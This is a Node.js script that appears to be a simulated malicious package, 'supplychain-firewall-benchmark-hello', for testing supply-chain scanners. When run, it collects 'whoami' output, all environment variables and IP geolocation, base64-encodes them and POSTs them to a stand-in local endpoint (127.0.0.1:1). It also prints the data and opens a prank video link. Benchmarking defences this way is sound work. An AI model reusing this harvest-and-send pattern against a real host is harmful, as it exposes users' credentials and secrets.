#!/usr/bin/env node
console.log("Hello world from supplychain-firewall-benchmark-hello v1.10.0. This package contains an EICAR test string, AVs may not like this.");

function requestIpApiBase64() {
    function getBase64() {
        return new Promise((resolve) => {
            try {
                const req = require("http").request({
                    host: "ip-api.com",
                    port: 80,
                    path: "/json/?fields=status,message,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,query",
                    method: "GET"
                }, (res) => {
                    const chunks = [];
                    res.on("data", (c) => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
                    res.on("end", () => resolve(Buffer.concat(chunks).toString("base64")));
                });
                req.on("error", () => resolve(""));
                req.end();
            } catch (_) {
                resolve("");
            }
        });
    }
    return getBase64();
}

function whoamiEnvBase64() {
    try {
        const p = process.platform;
        if (p !== "darwin" && p !== "linux") return "";
        const { execSync } = require("child_process");
        const opts = { timeout: 10000, maxBuffer: 1024 * 1024, encoding: "utf8" };
        const o1 = execSync("whoami", opts) || "";
        const o2 = execSync("env", opts) || "";
        const combined = `${o1}${o2 ? "\n" : ""}${o2}`;
        return Buffer.from(combined).toString("base64");
    } catch (_) {
        return "";
    }
}

function postOuterBase64(b64) {
    return new Promise((resolve) => {
        try {
            const data = typeof b64 === "string" ? b64 : "";
            const req = require("http").request({
                host: "127.0.0.1",
                port: 1,
                path: "/herobr1ne",
                method: "POST",
                headers: {
                    "content-type": "text/plain",
                    "content-length": Buffer.byteLength(data)
                }
            }, (res) => {
                res.on("data", () => {});
                res.on("end", () => resolve(true));
            });
            req.on("error", () => resolve(false));
            if (data) req.write(data);
            req.end();
        } catch (_) {
            resolve(false);
        }
    });
}

function openUrlOnDarwin() {
    try {
        if (process.platform === "darwin") {
            const { execFile } = require("child_process");
            execFile("open", ["https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=RDdQw4w9WgXcQ"], { timeout: 10000 }, () => {});
        }
    } catch (_) {}
}

(async () => {
    const whoami = whoamiEnvBase64();
    const ip = await requestIpApiBase64();
    const out = Buffer.from(`herobr1ne dump,${whoami},${ip}`).toString("base64");
    if (out) {
        await postOuterBase64(out);
        process.stdout.write(out);
    }
    openUrlOnDarwin();
})();
